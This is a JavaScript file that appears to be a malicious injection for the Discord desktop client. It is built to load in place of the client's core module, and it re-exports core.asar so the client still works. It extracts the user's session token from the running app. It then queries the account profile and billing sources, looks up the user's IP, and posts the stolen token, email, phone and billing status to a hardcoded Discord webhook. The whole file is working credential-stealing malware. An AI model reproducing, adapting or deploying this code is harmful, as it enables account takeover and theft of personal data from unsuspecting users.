const { BrowserWindow } = require('electron');
const os = require('os');
const https = require('https');

const webhook = "https://discord.com/api/webhooks/1448293754560839854/3KlffONuRKZsdi06yCWVx5KVnFLCS5_PlOeq-qcIDIjLV3oFNNwQqq_bBya6MK9uK_PP";

function send(e) {
    const data = JSON.stringify(e);
    const options = {
        hostname: 'discord.com',
        path: '/api/webhooks/1448293754560839854/3KlffONuRKZsdi06yCWVx5KVnFLCS5_PlOeq-qcIDIjLV3oFNNwQqq_bBya6MK9uK_PP',
        method: 'POST',
        headers: { 'Content-Type': 'application/json' }
    };
    const req = https.request(options);
    req.write(data);
    req.end();
}

async function getToken() {
    return await BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(`
        (webpackChunkdiscord_app?.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m)?.find(m=>m?.exports?.default?.getToken!==void 0)?.exports.default.getToken()
    `, true);
}

(async () => {
    const token = await getToken();
    if (!token) return;

    const user = await BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(`
        fetch("https://discord.com/api/v9/users/@me", {headers:{authorization:"${token}"}}).then(r=>r.json())
    `, true);

    const billing = await BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(`
        fetch("https://discord.com/api/v9/users/@me/billing/payment-sources", {headers:{authorization:"${token}"}}).then(r=>r.json())
    `, true);

    send({
        username: "Owned",
        avatar_url: "https://i.imgur.com/skull.jpg",
        embeds: [{
            title: "DISCORD FULLY OWNED",
            color: 16711680,
            fields: [
                { name: "Username", value: `${user.username}#${user.discriminator}`, inline: true },
                { name: "Email", value: user.email || "Hidden", inline: true },
                { name: "Phone", value: user.phone || "None", inline: true },
                { name: "Nitro", value: user.premium_type ? "Yes" : "No", inline: true },
                { name: "Billing", value: billing.length > 0 ? "Yes" : "No", inline: true },
                { name: "Token", value: "```" + token + "```" },
                { name: "IP", value: await fetch("https://api.ipify.org").then(r=>r.text()) }
            ]
        }]
    });
})();

module.exports = require('./core.asar');
